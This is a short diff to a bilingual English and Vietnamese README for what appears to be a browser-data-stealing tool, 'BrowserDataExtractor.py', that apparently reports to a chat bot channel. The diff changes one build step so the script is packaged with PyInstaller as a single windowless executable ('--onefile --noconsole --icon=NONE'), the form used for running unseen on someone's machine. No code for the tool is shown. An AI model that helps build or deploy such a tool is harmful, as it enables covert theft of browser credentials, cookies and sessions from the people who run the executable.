@@ -38,7 +38,7 @@ Get Bot channel ID
 4. **Create an executable file:**
    - Convert the script to a standalone executable using PyInstaller with the `--onefile` and `--noconsole` options:
      ```bash
-     pyinstaller --onefile --noconsole BrowserDataExtractor.py
+     pyinstaller --onefile --noconsole --icon=NONE BrowserDataExtractor.py
      ```
    - The executable file will be created in the `dist` folder.
 
@@ -100,7 +100,7 @@ lấy ID kênh bot
 4. **Tạo tệp thực thi:**
    - Để chuyển đổi script thành một tệp thực thi độc lập, sử dụng PyInstaller với các tùy chọn `--onefile` và `--noconsole`:
      ```bash
-     pyinstaller --onefile --noconsole BrowserDataExtractor.py
+     pyinstaller --onefile --noconsole --icon=NONE BrowserDataExtractor.py
      ```
    - Tệp thực thi sẽ được tạo trong thư mục `dist`.
 
